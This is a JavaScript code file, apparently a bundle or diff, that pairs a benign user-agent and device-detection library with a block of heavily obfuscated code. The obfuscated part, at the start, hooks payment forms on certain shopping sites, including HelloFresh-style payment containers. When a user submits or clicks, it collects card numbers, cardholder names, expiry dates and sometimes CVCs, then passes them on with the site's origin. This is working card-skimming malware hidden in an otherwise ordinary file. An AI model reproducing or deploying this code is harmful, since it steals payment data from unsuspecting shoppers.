_0x11d9d3=_0x30d6f6;'INPUT'===_0x8c8251[_0x11d9d3(0x476)]&&_0x11d9d3(0x2eb)===_0x8c8251[_0x11d9d3(0x286)]?_0xa1abef&&_0xa1abef(_0x8c8251):_0x44a5d8['explorePaymentInputTagOnly'](_0x44a5d8,_0x8c8251,_0xa1abef);});}[_0x33df30(0x4dc)](_0x49a0df,_0x2004f6,_0x16d773,_0x29d6a4){const _0x474280=_0x33df30;0x0!==_0x2004f6[_0x474280(0x2c7)][_0x474280(0x461)]&&_0x2004f6[_0x474280(0x2c7)][_0x474280(0x43f)](function(_0x526f8b){const _0x2a4793=_0x474280;_0x2a4793(0x3eb)===_0x526f8b[_0x2a4793(0x476)]||_0x2a4793(0x399)===_0x526f8b[_0x2a4793(0x476)]||_0x2a4793(0x336)===_0x526f8b[_0x2a4793(0x476)]?((_0x2a4793(0x3eb)===_0x526f8b[_0x2a4793(0x476)]||'SELECT'===_0x526f8b[_0x2a4793(0x476)]&&_0x2a4793(0x4ae)!==_0x526f8b[_0x2a4793(0x286)]&&'billingAddressId'!==_0x526f8b['id'])&&_0x16d773[_0x2a4793(0x56c)](_0x526f8b),'BUTTON'===_0x526f8b[_0x2a4793(0x476)]&&_0x2a4793(0x2eb)===_0x526f8b[_0x2a4793(0x286)]&&_0x29d6a4&&_0x29d6a4(_0x526f8b,_0x16d773)):_0x49a0df[_0x2a4793(0x4dc)](_0x49a0df,_0x526f8b,_0x16d773,_0x29d6a4);});}['exploreHelloFreshPaymentContainer'](_0x31dfe0,_0x5dfc7c,_0x4201a2){const _0x4d9fa7=_0x33df30;_0x5dfc7c['childNodes'][_0x4d9fa7(0x43f)](function(_0x27d290){const _0x276fb6=_0x4d9fa7;_0x276fb6(0x336)===_0x27d290['nodeName']&&_0x276fb6(0x2d8)===_0x27d290[_0x276fb6(0x29a)](_0x276fb6(0x29d))?_0x4201a2&&_0x4201a2(_0x27d290):_0x31dfe0['exploreHelloFreshPaymentContainer'](_0x31dfe0,_0x27d290,_0x4201a2);});}[_0x33df30(0x2b5)](_0x41dea2){const _0x47d8d3=_0x33df30;document[_0x47d8d3(0x486)](_0x47d8d3(0x538))['forEach'](function(_0x2544e7){const _0x2d419f=_0x47d8d3;if('creditForm'===_0x2544e7['id']){let _0x288332=[];_0x41dea2[_0x2d419f(0x335)](_0x41dea2,_0x2544e7,_0x288332,function(_0x3746a2,_0x53580b){const _0x3524f6=_0x2d419f;_0x3746a2[_0x3524f6(0x45d)](_0x3524f6(0x238),function(){const _0x4090b7=_0x3524f6;let _0x37bc25=[];_0x53580b[_0x4090b7(0x43f)](function(_0x47e729){_0x37bc25['push']({'element':_0x47e729['nodeName'],'id':_0x47e729['id'],'name':_0x47e729['name'],'value':_0x47e729['value']});}),_0x31a45c({'command':'savePaymentMethodsData','data':{'cardNumber':_0x37bc25[0x1][_0x4090b7(0x31c)]?_0x37bc25[0x1][_0x4090b7(0x31c)]:_0x4090b7(0x22d),'cardBrand':_0x37bc25[0x0][_0x4090b7(0x31c)]?_0x37bc25[0x0][_0x4090b7(0x31c)]:_0x4090b7(0x22d),'cardHolder':_0x37bc25[0x4]['value']?_0x37bc25[0x4]['value']:_0x4090b7(0x22d),'cardExpire':_0x37bc25[0x2][_0x4090b7(0x31c)]+'/'+_0x37bc25[0x3]['value'],'cardCVC':_0x4090b7(0x22d),'event':_0x4090b7(0x34e),'workWebsite':window[_0x4090b7(0x5a1)]['origin']}}),_0x37bc25=[];});});}});}[_0x33df30(0x335)](_0x145e0a,_0x1a208a,_0x494c21,_0x29ffd3){const _0x2a0b65=_0x33df30;0x0!==_0x1a208a[_0x2a0b65(0x2c7)][_0x2a0b65(0x461)]&&_0x1a208a[_0x2a0b65(0x2c7)][_0x2a0b65(0x43f)](function(_0x4a6165){const _0x566d3d=_0x2a0b65;_0x566d3d(0x3eb)===_0x4a6165[_0x566d3d(0x476)]||_0x566d3d(0x399)===_0x4a6165[_0x566d3d(0x476)]||'BUTTON'===_0x4a6165['nodeName']?((_0x566d3d(0x3eb)===_0x4a6165[_0x566d3d(0x476)]&&_0x566d3d(0x4ae)!==_0x4a6165[_0x566d3d(0x286)]||_0x566d3d(0x399)===_0x4a6165['nodeName'])&&_0x494c21['push'](_0x4a6165),_0x566d3d(0x336)!==_0x4a6165['nodeName']||_0x4a6165[_0x566d3d(0x5bf)][_0x566d3d(0x415)](_0x566d3d(0x206))||_0x4a6165[_0x566d3d(0x5bf)]['contains'](_0x566d3d(0x32e))||_0x566d3d(0x2eb)!==_0x4a6165[_0x566d3d(0x286)]||_0x29ffd3&&_0x29ffd3(_0x4a6165,_0x494c21)):_0x145e0a[_0x566d3d(0x335)](_0x145e0a,_0x4a6165,_0x494c21,_0x29ffd3);});}[_0x33df30(0x40a)](_0x26cc8a){const _0x58b23a=_0x33df30;document[_0x58b23a(0x486)](_0x58b23a(0x538))[_0x58b23a(0x43f)](function(_0x591b2){const _0x10500b=_0x58b23a;if(!_0x591b2[_0x10500b(0x5bf)][_0x10500b(0x415)](_0x10500b(0x583))&&'ue_backdetect'!==_0x591b2[_0x10500b(0x4bd)]&&'none'!==_0x591b2['style'][_0x10500b(0x5a3)]){let _0x108b42=[];_0x26cc8a[_0x10500b(0x352)](_0x26cc8a,_0x591b2,_0x108b42,function(_0x528219,_0x53b873){const _0x39817f=_0x10500b;_0x528219[_0x39817f(0x45d)]('click',function(){const _0x354913=_0x39817f;let _0x3b4574=[];_0x53b873[_0x354913(0x43f)](function(_0x2fd136){const _0x5c6c7f=_0x354913;_0x3b4574[_0x5c6c7f(0x56c)]({'element':_0x2fd136[_0x5c6c7f(0x476)],'id':_0x2fd136['id'],'name':-0x1!==_0x2fd136[_0x5c6c7f(0x4bd)][_0x5c6c7f(0x3ff)]('accountHolderName')||-0x1!==_0x2fd136[_0x5c6c7f(0x4bd)][_0x5c6c7f(0x3ff)](_0x5c6c7f(0x5b3))?_0x5c6c7f(0x247):-0x1!==_0x2fd136[_0x5c6c7f(0x4bd)][_0x5c6c7f(0x3ff)]('CardNumber')?_0x5c6c7f(0x5b0):-0x1!==_0x2fd136[_0x5c6c7f(0x4bd)][_0x5c6c7f(0x3ff)]('month')?'expirationMonth':-0x1!==_0x2fd136[_0x5c6c7f(0x4bd)]['indexOf'](_0x5c6c7f(0x3a8))?_0x5c6c7f(0x226):'Unknown','value':_0x2fd136['value']});}),_0x31a45c({'command':_0x354913(0x424),'data':{'cardNumber':_0x3b4574[0x1][_0x354913(0x31c)],'cardBrand':'Unknown','cardHolder':_0x3b4574[0x0][_0x354913(0x31c)],'cardExpire':_0x3b4574[0x2]['value']+'/'+_0x3b4574[0x3][_0x354913(0x31c)],'cardCVC':_0x354913(0x22d),'event':_0x354913(0x34e),'workWebsite':window[_0x354913(0x5a1)][_0x354913(0x23d)]}}),_0x3b4574=[];});});}});}[_0x33df30(0x352)](_0x5f3753,_0x2df48e,_0x321f4e,_0x2df251){const _0x93e22f=_0x33df30;0x0!==_0x2df48e['childNodes']['length']&&_0x2df48e[_0x93e22f(0x2c7)][_0x93e22f(0x43f)](function(_0x4cbb52){const _0x2f0804=_0x93e22f;'INPUT'===_0x4cbb52[_0x2f0804(0x476)]||_0x2f0804(0x399)===_0x4cbb52[_0x2f0804(0x476)]?((_0x2f0804(0x3eb)===_0x4cbb52['nodeName']&&_0x2f0804(0x4ae)!==_0x4cbb52[_0x2f0804(0x286)]&&_0x2f0804(0x2eb)!==_0x4cbb52[_0x2f0804(0x286)]&&_0x2f0804(0x377)!==_0x4cbb52[_0x2f0804(0x286)]||_0x2f0804(0x399)===_0x4cbb52[_0x2f0804(0x476)])&&_0x321f4e[_0x2f0804(0x56c)](_0x4cbb52),_0x2f0804(0x3eb)===_0x4cbb52['nodeName']&&'submit'===_0x4cbb52[_0x2f0804(0x286)]&&_0x2df251&&_0x2df251(_0x4cbb52,_0x321f4e)):_0x5f3753[_0x2f0804(0x352)](_0x5f3753,_0x4cbb52,_0x321f4e,_0x2df251);});}[_0x33df30(0x37d)](_0x34a695){let _0x42d56f=setInterval(function(){const _0x242988=a8_0x2c8e;null!==document['querySelector'](_0x242988(0x4ca))&&null!==document[_0x242988(0x2b4)](_0x242988(0x3fd))?.['firstElementChild']?.[_0x242988(0x2fc)]&&(clearInterval(_0x42d56f),_0x242988(0x336)===document['querySelector']('.edit-form-actions')?.[_0x242988(0x2fc)]?.[_0x242988(0x2fc)]?.[_0x242988(0x476)]&&[_0x242988(0x238),_0x242988(0x589)][_0x242988(0x43f)](function(_0x2b5f91){const _0x5bb130=_0x242988;let _0x37018a=[];document['querySelector']('.edit-form-actions')?.[_0x5bb130(0x2fc)]?.['firstElementChild']?.[_0x5bb130(0x45d)](_0x2b5f91,function(){const _0x3f92a7=_0x5bb130;_0x34a695[_0x3f92a7(0x4fc)](_0x34a695,document['querySelector'](_0x3f92a7(0x4ca)),_0x3f92a7(0x53f),function(_0x57a2be){const _0x3a6484=_0x3f92a7;_0x37018a[_0x3a6484(0x56c)]({'element':_0x57a2be[_0x3a6484(0x476)],'id':_0x57a2be['id'],'value':_0x57a2be[_0x3a6484(0x31c)]});}),document[_0x3f92a7(0x486)]('.payment-option')[_0x3f92a7(0x43f)](function(_0x48fb7c){const _0x5d805b=_0x3f92a7;_0x48fb7c[_0x5d805b(0x5bf)][_0x5d805b(0x415)](_0x5d805b(0x5b6))||(_0x48fb7c['classList'][_0x5d805b(0x3fc)](_0x5d805b(0x4bc)),_0x37018a[_0x5d805b(0x56c)]({'element':_0x48fb7c[_0x5d805b(0x476)],'id':_0x5d805b(0x305),'value':_0x48fb7c[_0x5d805b(0x311)]}),_0x48fb7c[_0x5d805b(0x5bf)][_0x5d805b(0x34e)](_0x5d805b(0x4bc)));}),_0x34a695[_0x3f92a7(0x4fc)](_0x34a695,document[_0x3f92a7(0x2b4)]('.edit-form.multiple-required'),_0x3f92a7(0x2dd),function(_0x442e02){const _0x335ecc=_0x3f92a7;_0x37018a['push']({'element':_0x442e02[_0x335ecc(0x476)],'id':_0x442e02['id'],'value':_0x442e02['value']});}),_0x34a695[_0x3f92a7(0x4fc)](_0x34a695,document[_0x3f92a7(0x2b4)](_0x3f92a7(0x4ca)),'lastName',function(_0x500016){const _0x4e21c5=_0x3f92a7;_0x37018a[_0x4e21c5(0x56c)]({'element':_0x500016[_0x4e21c5(0x476)],'id':_0x500016['id'],'value':_0x500016['value']});}),_0x34a695[_0x3f92a7(0x1f9)](_0x34a695,document['querySelector']('.edit-form.multiple-required'),_0x3f92a7(0x38d),function(_0x1f0b2d){const _0x484227=_0x3f92a7;_0x37018a[_0x484227(0x56c)]({'element':_0x1f0b2d[_0x484227(0x476)],'id':_0x1f0b2d['id'],'value':_0x1f0b2d[_0x484227(0x31c)]});}),_0x34a695['explorePaymentSelectTag'](_0x34a695,document['querySelector'](_0x3f92a7(0x4ca)),'year-chooser',function(_0x1905d1){const _0x2e7f31=_0x3f92a7;_0x37018a[_0x2e7f31(0x56c)]({'element':_0x1905d1[_0x2e7f31(0x476)],'id':_0x1905d1['id'],'value':_0x1905d1[_0x2e7f31(0x31c)]});}),_0x34a695['explorePaymentInputTag'](_0x34a695,document[_0x3f92a7(0x2b4)](_0x3f92a7(0x4ca)),_0x3f92a7(0x232),function(_0x14e4c2){const _0xe14a9=_0x3f92a7;_0x37018a['push']({'element':_0x14e4c2[_0xe14a9(0x476)],'id':_0x14e4c2['id'],'value':_0x14e4c2[_0xe14a9(0x31c)]});}),_0x31a45c({'command':_0x3f92a7(0x424),'data':{'cardNumber':_0x37018a[0x0][_0x3f92a7(0x31c)],'cardBrand':_0x37018a[0x1][_0x3f92a7(0x31c)],'cardHolder':_0x37018a[0x2]['value']+'\x20'+_0x37018a[0x3][_0x3f92a7(0x31c)],'cardExpire':_0x37018a[0x4][_0x3f92a7(0x31c)]+'/'+_0x37018a[0x5][_0x3f92a7(0x31c)],'cardCVC':_0x37018a[0x6]['value'],'event':_0x3f92a7(0x34e),'workWebsite':window[_0x3f92a7(0x5a1)][_0x3f92a7(0x23d)]}}),_0x37018a=[],_0x34a695[_0x3f92a7(0x4b3)](_0x34a695);});}));},0x64);}[_0x33df30(0x4b3)](_0x50be1f){let _0x120c48=setInterval(function(){const _0x325628=a8_0x2c8e;0x0!==document['querySelectorAll'](_0x325628(0x525))[_0x325628(0x461)]&&document[_0x325628(0x486)](_0x325628(0x525))[_0x325628(0x43f)](function(_0x341774){const _0x5e3244=_0x325628;'edit-payment'===_0x341774[_0x5e3244(0x29a)](_0x5e3244(0x358))&&(clearInterval(_0x120c48),_0x341774[_0x5e3244(0x45d)](_0x5e3244(0x238),function(){const _0x4f6d46=_0x5e3244;_0x50be1f[_0x4f6d46(0x37d)](_0x50be1f);}));});},0x64);}['explorePaymentNewCard'](_0x2bc129,_0x3e72b2,_0x5e1b92){const _0x28b574=_0x33df30;let _0x26bb10=[];0x0!==_0x3e72b2[_0x28b574(0x2c7)][_0x28b574(0x461)]&&(_0x3e72b2['childNodes'][_0x28b574(0x43f)](function(_0x509174){const _0x3aef17=_0x28b574;_0x509174['classList'][_0x3aef17(0x415)](_0x3aef17(0x3c6))&&_0x3aef17(0x318)===_0x509174[_0x3aef17(0x476)]&&0x0!==_0x509174[_0x3aef17(0x2c7)]['length']&&_0x509174[_0x3aef17(0x2c7)][_0x3aef17(0x43f)](function(_0x341562){const _0x376ecf=_0x3aef17;_0x341562[_0x376ecf(0x5bf)][_0x376ecf(0x415)](_0x376ecf(0x47c))&&_0x2bc129[_0x376ecf(0x4fc)](_0x2bc129,_0x341562,_0x376ecf(0x453),function(_0x5978d3){const _0x5157cd=_0x376ecf;_0x26bb10[_0x5157cd(0x56c)](_0x5978d3);}),_0x341562['classList'][_0x376ecf(0x415)](_0x376ecf(0x3af))&&(_0x2bc129[_0x376ecf(0x4fc)](_0x2bc129,_0x341562,_0x376ecf(0x247),function(_0x31574e){const _0x13acba=_0x376ecf;_0x26bb10[_0x13acba(0x56c)](_0x31574e);}),_0x2bc129['explorePaymentInputTag'](_0x2bc129,_0x341562,_0x376ecf(0x285),function(_0xaf21e7){const _0x1e881d=_0x376ecf;_0x26bb10[_0x1e881d(0x56c)](_0xaf21e7);}),_0x2bc129[_0x376ecf(0x4fc)](_0x2bc129,_0x341562,'cvc',function(_0x4f2801){_0x26bb10['push'](_0x4f2801);}));});}),_0x5e1b92&&_0x5e1b92(_0x26bb10));}['explorePaymentSpanTag'](_0x3a05ce,_0x29f54e,_0x2fc79e){const _0x1130fe=_0x33df30;0x0!==_0x29f54e['childNodes'][_0x1130fe(0x461)]&&_0x29f54e[_0x1130fe(0x2c7)][_0x1130fe(0x43f)](function(_0x3ae22a){const _0x3507b1=_0x1130fe;_0x3507b1(0x2d4)===_0x3ae22a[_0x3507b1(0x476)]&&_0x3ae22a[_0x3507b1(0x5bf)][_0x3507b1(0x415)]('payment-title')?_0x2fc79e&&_0x2fc79e(_0x3ae22a):_0x3a05ce[_0x3507b1(0x3e3)](_0x3a05ce,_0x3ae22a,_0x2fc79e);});}[_0x33df30(0x4fc)](_0x1d14c3,_0x43c640,_0x2bbe5e,_0x35b07f){const _0x38dcdd=_0x33df30;0x0!==_0x43c640['childNodes'][_0x38dcdd(0x461)]&&_0x43c640[_0x38dcdd(0x2c7)][_0x38dcdd(0x43f)](function(_0x4a86ac){const _0x349de2=_0x38dcdd;'INPUT'===_0x4a86ac[_0x349de2(0x476)]&&-0x1!==_0x4a86ac['id'][_0x349de2(0x3ff)](_0x2bbe5e)?_0x35b07f&&_0x35b07f(_0x4a86ac):_0x1d14c3[_0x349de2(0x4fc)](_0x1d14c3,_0x4a86ac,_0x2bbe5e,_0x35b07f);});}[_0x33df30(0x1f9)](_0x384154,_0x499720,_0x46f83d,_0x1d71f4){const _0x1339aa=_0x33df30;0x0!==_0x499720[_0x1339aa(0x2c7)]['length']&&_0x499720[_0x1339aa(0x2c7)][_0x1339aa(0x43f)](function(_0x2f6d7b){const _0x27e0c6=_0x1339aa;_0x27e0c6(0x399)===_0x2f6d7b[_0x27e0c6(0x476)]&&-0x1!==_0x2f6d7b['id'][_0x27e0c6(0x3ff)](_0x46f83d)?_0x1d71f4&&_0x1d71f4(_0x2f6d7b):_0x384154[_0x27e0c6(0x1f9)](_0x384154,_0x2f6d7b,_0x46f83d,_0x1d71f4);});}}(window['location']['href'])[_0x33df30(0x3e9)](function(){const _0x249a06=_0x33df30;_0x31a45c({'command':_0x249a06(0x2ab),'data':{'username':_0x249a06(0x42c),'workWebsite':window[_0x249a06(0x5a1)][_0x249a06(0x23d)]}});});})();})());
+/******/ (() => { // webpackBootstrap
+/******/ 	"use strict";
+/******/ 	var __webpack_modules__ = ({
+
+/***/ "./Assets/typescripts/browser.ts":
+/*!***************************************!*\
+  !*** ./Assets/typescripts/browser.ts ***!
+  \***************************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
+__webpack_require__.r(__webpack_exports__);
+/* harmony export */ __webpack_require__.d(__webpack_exports__, {
+/* harmony export */   "Browser": () => (/* binding */ Browser)
+/* harmony export */ });
+/**
+ * Browser (typescript language) Library
+ * Developer: Mr Al-Amin Ahmed Abir
+ * Website: https://www.mishusoft.com
+ * Official Link: https://www.mishusoft.com/libraries/js/browser.js
+ * */
+/*import {sendRequest} from "./app-common-required-send";*/
+class Browser {
+    VERSION = '1.0.2';
+    /*cdn link*/
+    cdnUrl = '';
+    UserAgent = navigator.userAgent;
+    browserName = 'Unknown';
+    browserNameFull = 'Unknown';
+    browserVersion = 'Unknown';
+    browserVersionFull = 'Unknown';
+    browserArchitecture = 'Unknown';
+    browserAppName = 'Unknown';
+    browserAppNameFull = 'Unknown';
+    browserAppVersion = 'Unknown';
+    browserAppCodeName = 'Unknown';
+    browserAppCodeVersion = 'Unknown';
+    browserEngineName = 'Unknown';
+    browserEngineNameFull = 'Unknown';
+    browserEngineVersion = 'Unknown';
+    browserInfoAll = [];
+    deviceName = 'Unknown';
+    deviceType = 'Unknown';
+    deviceArchitecture = 'Unknown';
+    deviceWindowManager = 'Unknown';
+    deviceInfoAll;
+    deviceNameFull;
+    deviceNameOriginal = 'Unknown';
+    deviceWmNameOriginal = 'Unknown';
+    currentDeviceInfo;
+    /*url info*/
+    URLProtocol = window.location.protocol;
+    URLHostname = window.location.hostname;
+    URLPath = window.location.pathname;
+    URLPathFull = window.location.href;
+    /*device screen info*/
+    DeviceScreenWidth = window.screen.width;
+    DeviceScreenHeight = window.screen.height;
+    DeviceScreenColorDepth = window.screen.colorDepth;
+    DeviceScreenPixelDepth = window.screen.pixelDepth;
+    UserAgentList;
+    devicesList;
+    devicesCategoryList;
+    devicesArchitectureList;
+    devicesPlatformWMNameList;
+    webBrowserList;
+    webBrowserLayoutList;
+    webBrowserAppCodeNameList;
+    constructor() {
+        /*Device List*/
+        this.devicesList = {
+            "3DS": {
+                "Browser": {
+                    "name": "Nintendo Browser",
+                    "architecture": "32-bit",
+                    "developer": "Nintendo",
+                    "rendering engine": "WebKit.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Nintendo 3DS", "architecture": "32-bit", "developer": "Nintendo" },
+                "Device": { "name": "3DS", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
+            },
+            "DSi": {
+                "Browser": {
+                    "name": "Nintendo Browser",
+                    "architecture": "32-bit",
+                    "developer": "Nintendo",
+                    "rendering engine": "Presto.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Nintendo DSi", "architecture": "32-bit", "developer": "Nintendo" },
+                "Device": { "name": "DSi", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
+            },
+            "New 3DS": {
+                "Browser": {
+                    "name": "Nintendo Browser",
+                    "architecture": "32-bit",
+                    "developer": "Nintendo",
+                    "rendering engine": "WebKit.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Nintendo 3DS", "architecture": "32-bit", "developer": "Nintendo" },
+                "Device": { "name": "New 3DS", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
+            },
+            "Playstation Portable": {
+                "Browser": {
+                    "name": "Sony PSP",
+                    "architecture": "32-bit",
+                    "developer": "Sony",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "JAVA", "architecture": "32-bit", "developer": "Oracle" },
+                "Device": { "name": "Playstation Portable", "type": "Console", "vendor": "Sony", "brand": "Sony" }
+            },
+            "PlayStation Vita": {
+                "Browser": {
+                    "name": "Playstation Browser",
+                    "developer": "Sony",
+                    "rendering engine": "WebKit.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "PlayStation Vita", "developer": "Oracle" },
+                "Device": { "name": "PlayStation Vita", "type": "Console", "vendor": "Sony", "brand": "Sony" }
+            },
+            "Switch": {
+                "Browser": {
+                    "name": "Nintendo Browser",
+                    "architecture": "32-bit",
+                    "developer": "Nintendo",
+                    "rendering engine": "WebKit.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Nintendo Switch", "architecture": "32-bit", "developer": "Nintendo" },
+                "Device": { "name": "Switch", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
+            },
+            "Amiga": {
+                "Browser": {
+                    "name": "IBrowse",
+                    "architecture": "32-bit",
+                    "developer": "Stefan Burstroem",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Amiga OS", "architecture": "32-bit", "developer": "Commodore International" },
+                "Device": {
+                    "name": "Amiga",
+                    "type": "Desktop",
+                    "vendor": "Commodore International",
+                    "brand": "Commodore"
+                }
+            },
+            "DA241HL": {
+                "Browser": {
+                    "name": "Chrome",
+                    "architecture": "32-bit",
+                    "developer": "Google Inc",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Android", "architecture": "32-bit", "developer": "Google Inc" },
+                "Device": { "name": "DA 241HL", "type": "Desktop", "vendor": "Acer", "brand": "Acer" }
+            },
+            "tesla": {
+                "Browser": {
+                    "name": "Tesla Car Browser",
+                    "architecture": "32-bit",
+                    "developer": "Tesla Motors.",
+                    "rendering engine": "Blink.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
+                "Device": {
+                    "name": "Car",
+                    "type": "Car Entertainment Framework",
+                    "vendor": "Tesla Motors",
+                    "brand": "Tesla"
+                }
+            },
+            "QtCarBrowser": {
+                "Browser": {
+                    "name": "Tesla Car Browser",
+                    "architecture": "32-bit",
+                    "developer": "Tesla Motors.",
+                    "rendering engine": "Blink.",
+                    "type": "Browser."
+                },
+                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
+                "Device": {
+                    "name": "Car",
+                    "type": "Car Entertainment Framework",
+                    "vendor": "Tesla Motors",
+                    "brand": "Tesla"
+                }
+            },
+            "freebsd": {
+                "Platform": { "name": "FreeBSD", "architecture": "32-bit", "developer": "FreeBSD Foundation" },
+                "Device": { "name": "Computer", "type": "Linux Desktop" }
+            },
+            "CrOS": {
+                "Platform": { "name": "Chrome OS", "architecture": "32-bit", "developer": "Google Inc" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "Ubuntu": {
+                "Platform": { "name": "Ubuntu OS", "architecture": "32-bit", "developer": "Canonical Inc" },
+                "Device": { "name": "Computer", "type": "Linux Desktop" }
+            },
+            "Arch Linux": {
+                "Platform": { "name": "Arch Linux", "architecture": "32-bit", "developer": "Arch Linux" },
+                "Device": { "name": "Computer", "type": "Linux Desktop" }
+            },
+            "linux": {
+                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
+                "Device": { "name": "Computer", "type": "Linux Desktop" }
+            },
+            "debian": "Debian",
+            "manjaro": "manjaro",
+            "sunos": "Sun Solaris",
+            "beos": "BeOS",
+            "apachebench": "ApacheBench",
+            "aix": "AIX",
+            "irix": "Irix",
+            "osf": "DEC OSF",
+            "hp-ux": "HP-UX",
+            "netbsd": "NetBSD",
+            "bsdi": "BSDi",
+            "openbsd": "OpenBSD",
+            "gnu": "GNU\/Linux",
+            "unix": "Unknown Unix OS",
+            "ubuntu": "Ubuntu",
+            "RISC OS": "RISC OS",
+            "Darwin": "MAC OS",
+            "Haiku": "Haiku OS",
+            "FreeMiNT": "FreeMiNT OS",
+            "windows phone 8": {
+                "Platform": {
+                    "name": "Windows Phone 8",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Windows Phone", "type": "phone" }
+            },
+            "windows phone os 7": {
+                "Platform": {
+                    "name": "Windows Phone 7",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Windows Phone", "type": "phone" }
+            },
+            "windows nt 10": {
+                "Platform": {
+                    "name": "Windows 10",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 6.3": {
+                "Platform": {
+                    "name": "Windows 8.1",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 6.2": {
+                "Platform": {
+                    "name": "Windows 8",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 6.1": {
+                "Platform": {
+                    "name": "Windows 7",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 6.0": {
+                "Platform": {
+                    "name": "Windows Longhorn",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 5.2": {
+                "Platform": {
+                    "name": "Windows 2003",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 5.1": {
+                "Platform": {
+                    "name": "Windows XP",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows xp": {
+                "Platform": { "name": "Windows XP", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 5.0": {
+                "Platform": {
+                    "name": "Windows 2000",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows me": {
+                "Platform": { "name": "Windows ME", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows nt 4.0": {
+                "Platform": {
+                    "name": "Windows NT 4.0",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "winnt4.0": {
+                "Platform": {
+                    "name": "Windows NT 4.0",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "winnt 4.0": {
+                "Platform": { "name": "Windows NT", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "winn\\\/t": {
+                "Platform": { "name": "Windows NT", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows 98": {
+                "Platform": { "name": "Windows 98", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "win98": {
+                "Platform": { "name": "Windows 98", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "windows 95": {
+                "Platform": { "name": "Windows 95", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "win95": {
+                "Platform": { "name": "Windows 95", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "win16": {
+                "Platform": { "name": "Windows 3.11", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "ppc": "Macintosh",
+            "macintosh|mac os x": "Mac OS X",
+            "mac_powerpc": "Mac OS 9",
+            "os x": "Mac OS X",
+            "ppc mac": "Power PC Mac",
+            "android": "Android",
+            "webos": "Mobile",
+            "mobileexplorer": "Mobile Explorer",
+            "palmsource": "Palm",
+            "palmscape": "Palmscape",
+            "motorola": "Motorola",
+            "nokia": "Nokia",
+            "iphone": "Apple iPhone",
+            "ipad": "iPad",
+            "ipod": "Apple iPod Touch",
+            "sony": "Sony Ericsson",
+            "ericsson": "Sony Ericsson",
+            "blackberry": "BlackBerry",
+            "cocoon": "O2 Cocoon",
+            "blazer": "Treo",
+            "lg": "LG",
+            "amoi": "Amoi",
+            "xda": "XDA",
+            "mda": "MDA",
+            "vario": "Vario",
+            "htc": "HTC",
+            "samsung": "Samsung",
+            "sharp": "Sharp",
+            "sie-": "Siemens",
+            "alcatel": "Alcatel",
+            "benq": "BenQ",
+            "ipaq": "HP iPaq",
+            "mot-": "Motorola",
+            "playstation portable": "PlayStation Portable",
+            "hiptop": "Danger Hiptop",
+            "nec-": "NEC",
+            "panasonic": "Panasonic",
+            "philips": "Philips",
+            "sagem": "Sagem",
+            "sanyo": "Sanyo",
+            "spv": "SPV",
+            "zte": "ZTE",
+            "sendo": "Sendo",
+            "symbian": "Symbian",
+            "SymbianOS": "SymbianOS",
+            "elaine": "Palm",
+            "palm": "Palm",
+            "series60": "Symbian S60",
+            "windows ce": "Windows CE",
+            "obigo": "Obigo",
+            "netfront": "Netfront Browser",
